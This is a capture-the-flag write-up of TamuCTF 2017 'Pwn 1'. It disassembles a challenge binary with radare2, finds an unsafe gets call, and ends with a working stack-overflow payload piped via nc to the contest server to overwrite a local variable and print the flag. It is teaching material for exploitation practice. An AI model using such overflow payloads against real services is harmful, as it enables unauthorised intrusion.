---
author:
  email: tzaoh1@gmail.com
  github: https://github.com/tzaoh
  image:
  - /images/avatar-64x64.png
  name:
  - Tzaoh
cardbackground: 'white'
cardtitlecolor: 'orange'
post_categories:
- CTFs
date: 2017-05-27T18:56:18+02:00
description: a
tags:
- test
title: "TamuCTF 2017 - Pwn 1"
summary: "We are told that there is a binary running remotely and its code is available to download. Lets download and open it with r2."
cardthumbimage: "/assets/TamuCTF2017/title.png"
---

![Pwn1 Challenge Description](/assets/TamuCTF2017/pwn1/1-pwn1_description.png)

We are told that there is a binary running remotely and its code is available to download. Lets download and open it with r2.

```bash
$ wget https://ctf.tamu.edu/files/7e968d03d9caa11a2f4f2909bd3cabc9/pwn1
$ r2 pwn1
```

Now that the binary is opened, we need to analyze its content.

{{< highlight r2 "hl_lines=28 29" >}}
[0x08048450]> afl
0x08048390    3 35           sym._init
0x080483b3    1 25           fcn.080483b3
0x080483cc    1 4            sub.gets_12_3cc
0x080483d0    1 6            sym.imp.gets
0x080483d6    2 10   -> 22   fcn.080483d6
0x080483e0    1 6            sym.imp._IO_getc
0x080483e6    2 10   -> 22   fcn.080483e6
0x080483f0    1 6            sym.imp.puts
0x080483f6    2 10   -> 22   fcn.080483f6
0x08048400    1 6            sym.imp.__libc_start_main
0x08048406    2 10   -> 22   fcn.08048406
0x08048410    1 6            sym.imp.setvbuf
0x08048416    2 10   -> 22   fcn.08048416
0x08048420    1 6            sym.imp.fopen
0x08048426    2 10   -> 22   fcn.08048426
0x08048430    1 6            sym.imp.putchar
0x08048436    2 10   -> 22   fcn.08048436
0x08048440    1 6            sub.__gmon_start___252_440
0x08048448    1 8            fcn.08048448
0x08048450    1 33           entry0
0x08048471    1 1            fcn.08048471
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x08048490    4 43           sym.deregister_tm_clones
0x080484bc    4 57           fcn.080484bc
0x080484f5    3 41           fcn.080484f5
0x08048520    8 43   -> 93   sym.frame_dummy
0x0804854b    4 103          sym.print_flag
0x080485b2    4 120          main
0x08048630    4 93           sym.__libc_csu_init
0x0804868d    1 5            fcn.0804868d
0x08048692    1 22           fcn.08048692
{{< /highlight >}}

Interesting, there is `print_flag` function at `0x0804854b`. Lets see what's inside.

{{< highlight r2 "hl_lines=18 20" >}}
[0xf771eac0]> s sym.print_flag	# We move to beginning of print_flag function
[0x0804854b]> pdf 
/ (fcn) sym.print_flag 103
|   sym.print_flag ();
|           ; var int local_dh @ ebp-0xd
|           ; var int local_ch @ ebp-0xc
|           ; CALL XREF from 0x08048606 (main)
|           0x0804854b      55             push ebp
|           0x0804854c      89e5           ebp = esp
|           0x0804854e      83ec18         esp -= 0x18
|           0x08048551      83ec0c         esp -= 0xc
|           0x08048554      68b0860408     push str.How_did_you_figure_out_my_secret__
|              ; int puts(const char *s)
|           0x08048559      e892feffff     sym.imp.puts ()
|           0x0804855e      83c410         esp += 0x10
|           0x08048561      83ec08         esp -= 8
|           0x08048564      68d3860408     push 0x80486d3
|           0x08048569      68d5860408     push str.flag.txt                                  
|              ; file*fopen(const char *filename,
|           0x0804856e      e8adfeffff     sym.imp.fopen ()                                   
|           0x08048573      83c410         esp += 0x10
|           0x08048576      8945f4         dword [local_ch] = eax
|       ,=< 0x08048579      eb10           goto 0x804858b
|       |      ; JMP XREF from 0x080485a0 (sym.print_flag)
|      .--> 0x0804857b      0fbe45f3       eax = byte [local_dh]
|      ||   0x0804857f      83ec0c         esp -= 0xc
|      ||   0x08048582      50             push eax
|      ||   0x08048583      e8a8feffff     sym.imp.putchar ()          ; int putchar(int c)
|      ||   0x08048588      83c410         esp += 0x10
|      !|      ; JMP XREF from 0x08048579 (sym.print_flag)
|      |`-> 0x0804858b      83ec0c         esp -= 0xc
|      |    0x0804858e      ff75f4         push dword [local_ch]
|      |    0x08048591      e84afeffff     sym.imp._IO_getc ()         ; int getc(FILE *steam)
|      |    0x08048596      83c410         esp += 0x10
|      |    0x08048599      8845f3         byte [local_dh] = al
|      |    0x0804859c      807df3ff       var = byte [local_dh] - 0xff ; [0xff:1]=8
|      `==< 0x080485a0      75d9           if (var) goto 0x804857b
|           0x080485a2      83ec0c         esp -= 0xc
|           0x080485a5      6a0a           push 0xa
|           0x080485a7      e884feffff     sym.imp.putchar ()          ; int putchar(int c)
|           0x080485ac      83c410         esp += 0x10
|           0x080485af      90             
|           0x080485b0      c9             
\           0x080485b1      c3 
{{< /highlight >}}

Because of the offsets `0x08048569` and `0x0804856e` we can deduce that the function opens a file called `flag.txt` and prints its content. Fantastic :v: , so we just need to know who will call `print_flag`. This can be figured out through the `axt` command of r2 which stands for "cross reference to" the actual function.

```r2
[0x0804854b]> axt
call 0x8048606 call sym.print_flag in main
```

Cool, so this function will be called from offset `0x8048606` `main` Lets see whats inside it.

```r2
[0x0804854b]> s main
[0x080485b2]> pdf
```
![Pwn1 Condition](/assets/TamuCTF2017/pwn1/3-pwn1_condition.png)

We see that `print_flag` will be called if the condition `local_ch == 0xca11ab1e` is not satisfied. But wait a moment, if we give a closer look to the assembly instrucctions we realized that the only variable we are supposed to edit is `local_27h` through the `gets` function:

![Pwn1 Gets Call](/assets/TamuCTF2017/pwn1/4-pwn1_gets_call.png)

So what we need to do? As maybe you know, `gets` is an unsecure function, because it does not check how many characters it must copy in memory when you introduce them. Then if we input more characters than it is supposed store, we will be able to overwrite neighbor local variables!

How can we know the length of the string we must provide? By knowing where the variables are stored onto the stack

![Pwn1 Stack diagram](/assets/TamuCTF2017/pwn1/5-pwn1_stack_view.png)

So finally, how many bytes do we need to start writting `local_ch`
Easy!

`($ebp - 0xC) - ($ebp - 0x27)  = 0x27 - 0xC = 0x1B = 27d` 27 Characters.

```bash
$ python -c 'print("A"*27 + "\x1E\xAB\x11\xCA")' | nc pwn.ctf.tamu.edu 4322
Enter the secret word:
How did you figure out my secret?!
gigem{T00_435Y}
```

Answer: gigem{T00_435Y}

### Complete video

<a href="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc?autoplay=1"><img src="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc.png" width="400"/></a>

### Tools used:

 * [radare2](https://github.com/radare/radare2) - To analyze the binary.
 * [draw.io](https://www.draw.io/) - To draw some graphics.
 * [asciinema](https://asciinema.org) - To record the session.
